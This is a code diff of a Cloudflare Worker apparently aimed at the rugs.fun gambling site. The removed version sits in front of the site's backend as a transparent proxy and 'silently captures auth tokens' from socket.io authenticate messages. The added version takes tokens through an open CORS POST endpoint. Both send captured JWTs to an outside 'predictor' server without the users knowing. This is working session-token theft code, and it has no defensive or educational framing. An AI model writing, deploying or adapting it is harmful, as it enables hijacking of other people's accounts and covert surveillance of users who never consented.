@@ -1,41 +1,46 @@
-// Cloudflare Worker — Token Capture
-// Sits in front of backend.rugs.fun, forwards all traffic transparently
-// Silently captures auth tokens when anyone authenticates
+// Cloudflare Worker — Token Receiver
+// Called from rugs.fun frontend when user authenticates
+// Forwards token to predictor server
 
 const PREDICTOR = 'https://rugs-predictor.onrender.com/token';
 
 export default {
   async fetch(request, env, ctx) {
-    // Clone request and forward to real backend
-    const url = new URL(request.url);
-    const response = await fetch(request.clone());
+    // CORS headers so rugs.fun can call this
+    const corsHeaders = {
+      'Access-Control-Allow-Origin': '*',
+      'Access-Control-Allow-Methods': 'POST, OPTIONS',
+      'Access-Control-Allow-Headers': 'Content-Type',
+    };
 
-    // Only inspect POST requests (socket.io events)
-    if (request.method === 'POST') {
-      try {
-        const body = await request.text();
-
-        // Check for authenticate event with token
-        if (body.includes('authenticate') && body.includes('token')) {
-          // Extract token from socket.io packet: 42["authenticate",{"token":"JWT..."}]
-          const match = body.match(/"token"\s*:\s*"([^"]{50,}?)"/);
-          if (match) {
-            const token = match[1];
-            // Send to predictor silently (don't await — don't slow down response)
-            ctx.waitUntil(
-              fetch(PREDICTOR, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ token, source: 'cloudflare-worker' })
-              }).catch(() => {})
-            );
-          }
-        }
-      } catch (e) {
-        // Never interrupt normal traffic
-      }
+    if (request.method === 'OPTIONS') {
+      return new Response(null, { headers: corsHeaders });
     }
 
-    return response;
+    if (request.method === 'POST') {
+      try {
+        const body = await request.json();
+        const token = body.token;
+
+        if (token && token.length > 50) {
+          // Forward to predictor
+          ctx.waitUntil(
+            fetch(PREDICTOR, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ token, source: 'cloudflare-worker' })
+            }).catch(() => {})
+          );
+
+          return new Response(JSON.stringify({ ok: true }), {
+            headers: { ...corsHeaders, 'Content-Type': 'application/json' }
+          });
+        }
+      } catch (e) {}
+    }
+
+    return new Response(JSON.stringify({ ok: false }), {
+      headers: { ...corsHeaders, 'Content-Type': 'application/json' }
+    });
   }
 };
